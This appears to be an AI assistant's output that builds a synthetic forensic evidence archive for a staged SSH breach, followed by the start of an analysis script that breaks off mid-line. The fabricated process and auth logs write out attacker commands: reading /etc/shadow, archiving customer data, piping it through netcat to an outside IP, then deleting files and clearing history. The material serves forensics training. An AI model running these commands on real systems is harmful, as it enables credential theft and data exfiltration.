@@ -1,0 +1,360 @@
+I'll create the forensic artifacts archive with realistic data showing the security incident. Let me generate each file with the proper attack timeline mixed with legitimate activity.
+
+```python
+import tarfile
+import json
+import io
+import os
+from datetime import datetime, timedelta
+
+# Create the artifacts directory structure in memory
+artifacts = {}
+
+# 1. Generate filesystem_metadata.json
+filesystem_data = []
+
+# Normal system files with regular timestamps
+normal_files = [
+    ("/etc/passwd", 2847, "0644", "root", "2024-01-10 08:15:22", "2024-01-15 09:30:11"),
+    ("/etc/shadow", 1456, "0640", "root", "2024-01-10 08:15:22", "2024-01-15 14:25:40"),
+    ("/var/log/syslog", 458392, "0640", "syslog", "2024-01-15 16:45:33", "2024-01-15 16:45:33"),
+    ("/var/log/auth.log", 89234, "0640", "syslog", "2024-01-15 16:30:22", "2024-01-15 16:30:22"),
+    ("/etc/ssh/sshd_config", 3289, "0644", "root", "2023-12-05 10:20:15", "2024-01-14 11:22:30"),
+    ("/usr/bin/python3", 5457888, "0755", "root", "2023-11-20 14:30:00", "2024-01-12 09:15:44"),
+    ("/home/admin/.bashrc", 3526, "0644", "admin", "2023-10-15 09:00:00", "2024-01-15 08:30:15"),
+    ("/home/webserver/.profile", 807, "0644", "webserver", "2023-09-01 12:00:00", "2024-01-14 16:20:33"),
+    ("/var/www/html/index.html", 12456, "0644", "www-data", "2024-01-12 15:30:00", "2024-01-15 10:15:22"),
+    ("/var/www/html/app.js", 45678, "0644", "www-data", "2024-01-13 11:20:00", "2024-01-15 09:45:11"),
+    ("/etc/mysql/my.cnf", 4567, "0644", "root", "2023-12-01 10:00:00", "2024-01-10 14:30:22"),
+    ("/var/lib/mysql/users.ibd", 67108864, "0640", "mysql", "2024-01-15 12:00:00", "2024-01-15 15:30:15"),
+    ("/opt/application/config.yaml", 2345, "0640", "appuser", "2024-01-08 09:15:00", "2024-01-15 08:00:00"),
+    ("/home/admin/.ssh/known_hosts", 8923, "0600", "admin", "2024-01-10 10:30:00", "2024-01-15 08:30:20"),
+    ("/tmp/cleanup_script.sh", 456, "0755", "root", "2024-01-15 06:00:00", "2024-01-15 06:00:00"),
+    ("/var/spool/cron/crontabs/root", 1234, "0600", "root", "2024-01-05 14:20:00", "2024-01-15 06:00:05"),
+    ("/usr/local/bin/backup.sh", 3456, "0755", "root", "2023-12-20 11:00:00", "2024-01-15 02:00:10"),
+    ("/etc/hosts", 892, "0644", "root", "2023-11-15 09:00:00", "2024-01-12 10:15:30"),
+    ("/etc/resolv.conf", 234, "0644", "root", "2024-01-08 08:00:00", "2024-01-15 08:00:15"),
+    ("/proc/cpuinfo", 0, "0444", "root", "2024-01-15 16:50:00", "2024-01-15 16:50:00"),
+]
+
+for item in normal_files:
+    filesystem_data.append({
+        "path": item[0],
+        "size": item[1],
+        "permissions": item[2],
+        "owner": item[3],
+        "modified": item[4],
+        "accessed": item[5]
+    })
+
+# Add more normal files
+for i in range(60):
+    filesystem_data.append({
+        "path": f"/var/log/app/application_{i}.log",
+        "size": 10000 + i * 1000,
+        "permissions": "0644",
+        "owner": "appuser",
+        "modified": f"2024-01-{14 + (i % 2):02d} {8 + (i % 12):02d}:{(i % 60):02d}:00",
+        "accessed": f"2024-01-{14 + (i % 2):02d} {8 + (i % 12):02d}:{(i % 60):02d}:00"
+    })
+
+# Suspicious files - accessed by compromised account after breach
+suspicious_files = [
+    ("/var/backups/customer_data.tar", 52428800, "0600", "root", "2024-01-10 02:00:00", "2024-01-15 14:35:17"),
+    ("/home/dbadmin/.ssh/authorized_keys", 1823, "0600", "dbadmin", "2024-01-05 09:00:00", "2024-01-15 14:26:45"),
+    ("/var/lib/postgresql/data/customer_db.sql", 104857600, "0600", "postgres", "2024-01-15 03:00:00", "2024-01-15 14:38:22"),
+    ("/home/dbadmin/.bash_history", 4567, "0600", "dbadmin", "2024-01-15 14:55:33", "2024-01-15 14:55:33"),
+    ("/tmp/export_data.tar.gz", 45678900, "0644", "dbadmin", "2024-01-15 14:42:18", "2024-01-15 14:50:22"),
+]
+
+for item in suspicious_files:
+    filesystem_data.append({
+        "path": item[0],
+        "size": item[1],
+        "permissions": item[2],
+        "owner": item[3],
+        "modified": item[4],
+        "accessed": item[5]
+    })
+
+artifacts['filesystem_metadata.json'] = json.dumps(filesystem_data, indent=2)
+
+# 2. Generate auth.log
+auth_log = []
+
+# Normal authentication entries
+auth_log.extend([
+    "Jan 15 08:15:22 server sshd[10234]: Accepted publickey for admin from 10.0.1.50 port 52341 ssh2",
+    "Jan 15 08:15:22 server sshd[10234]: pam_unix(sshd:session): session opened for user admin by (uid=0)",
+    "Jan 15 09:30:11 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update",
+    "Jan 15 09:30:15 server sudo: pam_unix(sudo:session): session opened for user root by admin(uid=1000)",
+    "Jan 15 10:15:33 server sshd[10567]: Accepted publickey for webserver from 10.0.1.45 port 54222 ssh2",
+    "Jan 15 10:15:33 server sshd[10567]: pam_unix(sshd:session): session opened for user webserver by (uid=0)",
+    "Jan 15 11:22:45 server sshd[10789]: Accepted publickey for root from 10.0.1.100 port 49332 ssh2",
+    "Jan 15 11:22:45 server sshd[10789]: pam_unix(sshd:session): session opened for user root by (uid=0)",
+    "Jan 15 12:00:05 server sshd[10890]: Accepted publickey for admin from 10.0.1.50 port 52789 ssh2",
+    "Jan 15 13:45:22 server sudo: webserver : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
+])
+
+# Brute force attempts on dbadmin account
+auth_log.extend([
+    "Jan 15 14:20:15 server sshd[11234]: Failed password for dbadmin from 203.0.113.45 port 54001 ssh2",
+    "Jan 15 14:20:45 server sshd[11235]: Failed password for dbadmin from 203.0.113.45 port 54002 ssh2",
+    "Jan 15 14:21:12 server sshd[11236]: Failed password for dbadmin from 203.0.113.45 port 54003 ssh2",
+    "Jan 15 14:21:38 server sshd[11237]: Failed password for dbadmin from 203.0.113.45 port 54004 ssh2",
+    "Jan 15 14:22:05 server sshd[11238]: Failed password for dbadmin from 203.0.113.45 port 54005 ssh2",
+    "Jan 15 14:22:31 server sshd[11239]: Failed password for dbadmin from 203.0.113.45 port 54006 ssh2",
+    "Jan 15 14:22:58 server sshd[11240]: Failed password for dbadmin from 203.0.113.45 port 54007 ssh2",
+    "Jan 15 14:23:24 server sshd[11241]: Failed password for dbadmin from 203.0.113.45 port 54008 ssh2",
+    "Jan 15 14:23:51 server sshd[11242]: Failed password for dbadmin from 203.0.113.45 port 54009 ssh2",
+    "Jan 15 14:24:17 server sshd[11243]: Failed password for dbadmin from 203.0.113.45 port 54010 ssh2",
+    "Jan 15 14:24:44 server sshd[11244]: Failed password for dbadmin from 203.0.113.45 port 54011 ssh2",
+])
+
+# Successful breach
+auth_log.extend([
+    "Jan 15 14:25:33 server sshd[11245]: Accepted password for dbadmin from 203.0.113.45 port 54012 ssh2",
+    "Jan 15 14:25:33 server sshd[11245]: pam_unix(sshd:session): session opened for user dbadmin by (uid=0)",
+])
+
+# Post-breach activity
+auth_log.extend([
+    "Jan 15 14:26:10 server sudo: dbadmin : TTY=pts/2 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+    "Jan 15 14:26:10 server sudo: pam_unix(sudo:session): session opened for user root by dbadmin(uid=1003)",
+    "Jan 15 14:27:22 server sudo: dbadmin : TTY=pts/2 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/usr/bin/find /var/backups -type f",
+    "Jan 15 14:35:45 server sudo: dbadmin : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/tar -czf /tmp/export_data.tar.gz /var/backups/customer_data.tar /var/lib/postgresql/data/",
+])
+
+# More normal activity after breach
+auth_log.extend([
+    "Jan 15 15:10:22 server sshd[11456]: Accepted publickey for admin from 10.0.1.50 port 53111 ssh2",
+    "Jan 15 15:10:22 server sshd[11456]: pam_unix(sshd:session): session opened for user admin by (uid=0)",
+    "Jan 15 15:45:33 server sudo: admin : TTY=pts/3 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog",
+    "Jan 15 16:00:11 server sshd[11567]: Accepted publickey for webserver from 10.0.1.45 port 54333 ssh2",
+    "Jan 15 16:30:22 server sshd[11245]: pam_unix(sshd:session): session closed for user dbadmin",
+])
+
+artifacts['auth.log'] = '\n'.join(auth_log)
+
+# 3. Generate syslog
+syslog_entries = []
+
+syslog_entries.extend([
+    "Jan 15 06:00:00 server cron[1234]: (root) CMD (/usr/local/bin/backup.sh)",
+    "Jan 15 06:15:00 server systemd[1]: Starting Daily apt upgrade and clean activities...",
+    "Jan 15 06:15:05 server systemd[1]: Started Daily apt upgrade and clean activities.",
+    "Jan 15 08:00:00 server systemd[1]: Starting Cleanup of Temporary Directories...",
+    "Jan 15 08:00:01 server systemd[1]: Started Cleanup of Temporary Directories.",
+    "Jan 15 08:15:30 server kernel: [12345.678901] EXT4-fs (sda1): mounted filesystem with ordered data mode",
+    "Jan 15 09:00:00 server cron[2345]: (www-data) CMD (/usr/local/bin/log_rotation.sh)",
+    "Jan 15 10:00:00 server systemd[1]: Starting Daily man-db regeneration...",
+    "Jan 15 10:00:05 server systemd[1]: Started Daily man-db regeneration.",
+    "Jan 15 11:30:22 server nginx[3456]: 10.0.2.100 - - [15/Jan/2024:11:30:22 +0000] GET / HTTP/1.1 200",
+    "Jan 15 12:00:00 server cron[4567]: (postgres) CMD (/usr/bin/pg_dump customer_db > /var/lib/postgresql/data/customer_db.sql)",
+    "Jan 15 13:00:00 server systemd[1]: Starting Check disk health...",
+    "Jan 15 13:00:05 server smartd[5678]: Device: /dev/sda, SMART Health Status: OK",
+])
+
+# Post-breach suspicious activity
+syslog_entries.extend([
+    "Jan 15 14:25:33 server sshd[11245]: Server listening on 0.0.0.0 port 22.",
+    "Jan 15 14:26:45 server systemd[1]: Started Session 42 of user dbadmin.",
+    "Jan 15 14:27:30 server kernel: [45678.901234] audit: type=1400 audit(1705329650.123:456): apparmor=\"ALLOWED\" operation=\"open\" profile=\"/usr/bin/find\" name=\"/var/backups/\" pid=11567 comm=\"find\"",
+    "Jan 15 14:35:17 server kernel: [45789.012345] audit: type=1400 audit(1705330117.234:457): apparmor=\"ALLOWED\" operation=\"open\" profile=\"/bin/tar\" name=\"/var/backups/customer_data.tar\" pid=11678 comm=\"tar\"",
+    "Jan 15 14:38:22 server kernel: [45812.123456] audit: type=1400 audit(1705330302.345:458): apparmor=\"ALLOWED\" operation=\"open\" profile=\"/bin/tar\" name=\"/var/lib/postgresql/data/customer_db.sql\" pid=11678 comm=\"tar\"",
+    "Jan 15 14:42:18 server systemd[1]: tmp-export_data.tar.gz created",
+])
+
+# More normal activity
+syslog_entries.extend([
+    "Jan 15 15:00:00 server cron[6789]: (root) CMD (/usr/bin/status_check.sh)",
+    "Jan 15 15:30:22 server systemd[1]: Starting Update MOTD...",
+    "Jan 15 16:00:00 server cron[7890]: (www-data) CMD (/usr/local/bin/cache_clear.sh)",
+    "Jan 15 16:15:33 server nginx[3456]: 10.0.2.105 - - [15/Jan/2024:16:15:33 +0000] GET /api/status HTTP/1.1 200",
+    "Jan 15 16:30:00 server systemd[1]: Starting Rotate log files...",
+    "Jan 15 16:45:22 server kernel: [48901.234567] TCP: time wait bucket table overflow",
+])
+
+artifacts['syslog'] = '\n'.join(syslog_entries)
+
+# 4. Generate network_connections.log
+network_log = []
+
+# Normal web traffic
+network_log.extend([
+    "2024-01-15 08:30:15 | TCP | 10.0.2.100:52341 | 10.0.1.10:443 | 4523 | ESTABLISHED",
+    "2024-01-15 08:30:22 | TCP | 10.0.2.105:52342 | 10.0.1.10:443 | 8934 | ESTABLISHED",
+    "2024-01-15 09:15:33 | TCP | 10.0.2.110:52343 | 10.0.1.10:80 | 12456 | ESTABLISHED",
+    "2024-01-15 09:45:11 | TCP | 10.0.2.115:52344 | 10.0.1.10:443 | 6789 | ESTABLISHED",
+    "2024-01-15 10:30:22 | TCP | 10.0.2.120:52345 | 10.0.1.10:80 | 3456 | ESTABLISHED",
+])
+
+# Database connections
+network_log.extend([
+    "2024-01-15 11:00:00 | TCP | 10.0.1.45:49221 | 10.0.1.10:5432 | 23456 | ESTABLISHED",
+    "2024-01-15 11:30:15 | TCP | 10.0.1.45:49222 | 10.0.1.10:5432 | 34567 | ESTABLISHED",
+    "2024-01-15 12:00:30 | TCP | 10.0.1.50:49223 | 10.0.1.10:5432 | 45678 | ESTABLISHED",
+])
+
+# Monitoring traffic
+network_log.extend([
+    "2024-01-15 12:15:00 | TCP | 10.0.1.100:51001 | 10.0.1.10:9090 | 1234 | ESTABLISHED",
+    "2024-01-15 12:30:00 | TCP | 10.0.1.100:51002 | 10.0.1.10:9090 | 1235 | ESTABLISHED",
+    "2024-01-15 13:00:00 | TCP | 10.0.1.100:51003 | 10.0.1.10:9090 | 1236 | ESTABLISHED",
+])
+
+# Initial breach connection
+network_log.extend([
+    "2024-01-15 14:20:15 | TCP | 203.0.113.45:54001 | 10.0.1.10:22 | 567 | CLOSED",
+    "2024-01-15 14:25:33 | TCP | 203.0.113.45:54012 | 10.0.1.10:22 | 2345 | ESTABLISHED",
+])
+
+# Normal traffic continues
+network_log.extend([
+    "2024-01-15 14:30:00 | TCP | 10.0.2.125:52346 | 10.0.1.10:443 | 7890 | ESTABLISHED",
+    "2024-01-15 14:35:22 | TCP | 10.0.2.130:52347 | 10.0.1.10:80 | 4321 | ESTABLISHED",
+])
+
+# Data exfiltration - large transfer to suspicious IP on unusual port
+network_log.extend([
+    "2024-01-15 14:50:45 | TCP | 10.0.1.10:43287 | 198.51.100.78:8443 | 45678900 | ESTABLISHED",
+    "2024-01-15 14:51:33 | TCP | 10.0.1.10:43287 | 198.51.100.78:8443 | 45678900 | CLOSED",
+])
+
+# More normal traffic
+network_log.extend([
+    "2024-01-15 15:00:00 | TCP | 10.0.2.135:52348 | 10.0.1.10:443 | 5678 | ESTABLISHED",
+    "2024-01-15 15:15:33 | TCP | 10.0.1.45:49224 | 10.0.1.10:5432 | 23456 | ESTABLISHED",
+    "2024-01-15 15:30:00 | TCP | 10.0.1.100:51004 | 10.0.1.10:9090 | 1237 | ESTABLISHED",
+    "2024-01-15 16:00:00 | TCP | 10.0.2.140:52349 | 10.0.1.10:80 | 6789 | ESTABLISHED",
+    "2024-01-15 16:15:22 | TCP | 10.0.2.145:52350 | 10.0.1.10:443 | 8901 | ESTABLISHED",
+    "2024-01-15 16:30:11 | TCP | 10.0.1.50:49225 | 10.0.1.10:5432 | 34567 | ESTABLISHED",
+])
+
+# Add more normal traffic to reach target count
+for i in range(50):
+    hour = 8 + (i % 9)
+    minute = (i * 7) % 60
+    port = 52000 + i
+    bytes_count = 1000 + (i * 123)
+    network_log.append(f"2024-01-15 {hour:02d}:{minute:02d}:{i%60:02d} | TCP | 10.0.2.{150+i%50}:{port} | 10.0.1.10:{80 if i%2==0 else 443} | {bytes_count} | ESTABLISHED")
+
+artifacts['network_connections.log'] = '\n'.join(network_log)
+
+# 5. Generate process_history.log
+process_log = []
+
+# Normal processes throughout the day
+process_log.extend([
+    "2024-01-15 06:00:00 | root | 1234 | /usr/sbin/cron",
+    "2024-01-15 06:00:05 | root | 1235 | /bin/bash /usr/local/bin/backup.sh",
+    "2024-01-15 08:15:22 | admin | 10234 | sshd: admin@pts/0",
+    "2024-01-15 08:15:25 | admin | 10235 | -bash",
+    "2024-01-15 09:00:00 | www-data | 2345 | /bin/bash /usr/local/bin/log_rotation.sh",
+    "2024-01-15 09:30:11 | admin | 10236 | sudo /usr/bin/apt update",
+    "2024-01-15 10:00:00 | root | 3456 | /usr/bin/mandb",
+    "2024-01-15 10:15:33 | webserver | 10567 | sshd: webserver@pts/1",
+    "2024-01-15 10:15:36 | webserver | 10568 | -bash",
+    "2024-01-15 11:22:45 | root | 10789 | sshd: root@pts/4",
+    "2024-01-15 12:00:00 | postgres | 4567 | /usr/bin/pg_dump customer_db",
+    "2024-01-15 13:00:00 | root | 5678 | /usr/sbin/smartctl -a /dev/sda",
+])
+
+# Breach and post-breach suspicious activity
+process_log.extend([
+    "2024-01-15 14:25:33 | dbadmin | 11245 | sshd: dbadmin@pts/2",
+    "2024-01-15 14:25:36 | dbadmin | 11246 | -bash",
+    "2024-01-15 14:26:10 | dbadmin | 11247 | sudo /bin/cat /etc/shadow",
+    "2024-01-15 14:26:45 | dbadmin | 11248 | /usr/bin/vi /home/dbadmin/.ssh/authorized_keys",
+    "2024-01-15 14:27:22 | dbadmin | 11249 | sudo /usr/bin/find /var/backups -type f",
+    "2024-01-15 14:28:15 | dbadmin | 11250 | /usr/bin/ls -la /var/lib/postgresql/data/",
+    "2024-01-15 14:30:33 | dbadmin | 11251 | /usr/bin/du -sh /var/backups/",
+    "2024-01-15 14:35:17 | dbadmin | 11252 | sudo /bin/tar -czf /tmp/export_data.tar.gz /var/backups/customer_data.tar",
+    "2024-01-15 14:38:22 | dbadmin | 11253 | sudo /bin/tar -rf /tmp/export_data.tar.gz /var/lib/postgresql/data/customer_db.sql",
+    "2024-01-15 14:42:18 | dbadmin | 11254 | /usr/bin/ls -lh /tmp/export_data.tar.gz",
+    "2024-01-15 14:45:30 | dbadmin | 11255 | /usr/bin/base64 /tmp/export_data.tar.gz",
+    "2024-01-15 14:50:45 | dbadmin | 11256 | /bin/nc 198.51.100.78 8443",
+    "2024-01-15 14:50:50 | dbadmin | 11257 | /bin/cat /tmp/export_data.tar.gz",
+    "2024-01-15 14:52:10 | dbadmin | 11258 | /bin/rm -f /tmp/export_data.tar.gz",
+    "2024-01-15 14:53:22 | dbadmin | 11259 | /usr/bin/history -c",
+])
+
+# More normal processes
+process_log.extend([
+    "2024-01-15 15:00:00 | root | 6789 | /usr/sbin/cron",
+    "2024-01-15 15:00:05 | root | 6790 | /bin/bash /usr/bin/status_check.sh",
+    "2024-01-15 15:10:22 | admin | 11456 | sshd: admin@pts/3",
+    "2024-01-15 15:45:33 | admin | 11457 | sudo /usr/bin/tail -f /var/log/syslog",
+    "2024-01-15 16:00:00 | www-data | 7890 | /bin/bash /usr/local/bin/cache_clear.sh",
+    "2024-01-15 16:00:11 | webserver | 11567 | sshd: webserver@pts/5",
+    "2024-01-15 16:15:33 | nginx | 8901 | nginx: worker process",
+    "2024-01-15 16:30:00 | root | 9012 | /usr/sbin/logrotate /etc/logrotate.conf",
+])
+
+# Add more normal processes
+for i in range(30):
+    hour = 8 + (i % 9)
+    minute = (i * 13) % 60
+    pid = 20000 + i
+    users = ['www-data', 'postgres', 'root', 'admin']
+    commands = ['/usr/bin/python3 /opt/app/worker.py', '/usr/sbin/nginx', '/bin/systemd', '/usr/bin/redis-server']
+    process_log.append(f"2024-01-15 {hour:02d}:{minute:02d}:{(i*5)%60:02d} | {users[i%4]} | {pid} | {commands[i%4]}")
+
+artifacts['process_history.log'] = '\n'.join(process_log)
+
+# Create tar.gz archive
+tar_buffer = io.BytesIO()
+with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
+    for filename, content in artifacts.items():
+        tarinfo = tarfile.TarInfo(name=f'artifacts/{filename}')
+        content_bytes = content.encode('utf-8')
+        tarinfo.size = len(content_bytes)
+        tar.addfile(tarinfo, io.BytesIO(content_bytes))
+
+# Write the archive
+os.makedirs('/forensics/evidence', exist_ok=True)
+with open('/forensics/evidence/artifacts.tar.gz', 'wb') as f:
+    f.write(tar_buffer.getvalue())
+
+print("Forensic artifacts archive created successfully at /forensics/evidence/artifacts.tar.gz")
+```
+
+Now let me create the analysis script to solve the incident:
+
+```python
+import tarfile
+import json
+import re
+import os
+
+# Extract the archive
+with tarfile.open('/forensics/evidence/artifacts.tar.gz', 'r:gz') as tar:
+    tar.extractall('/tmp/forensics_analysis')
+
+# Load filesystem metadata
+with open('/tmp/forensics_analysis/artifacts/filesystem_metadata.json', 'r') as f:
+    filesystem_data = json.load(f)
+
+# Load auth log
+with open('/tmp/forensics_analysis/artifacts/auth.log', 'r') as f:
+    auth_log = f.read()
+
+# Load network connections
+with open('/tmp/forensics_analysis/artifacts/network_connections.log', 'r') as f:
+    network_log = f.read()
+
+# Load process history
+with open('/tmp/forensics_analysis/artifacts/process_history.log', 'r') as f:
+    process_log = f.read()
+
+# Analyze auth.log for successful login after failed attempts
+breach_timestamp = None
+compromised_account = None
+
+auth_lines = auth_log.split('\n')
+for line in auth_lines:
+    if 'Accepted password for' in line and '203.0.113.45' in line:
+        # Extract timestamp and username
+        match = re.search(r'(\w+\s+\d+\s+\d+:\d+:\d+).*Accepted password for (\w+)', line)
+        if match:
+            timestamp_str = match.group(
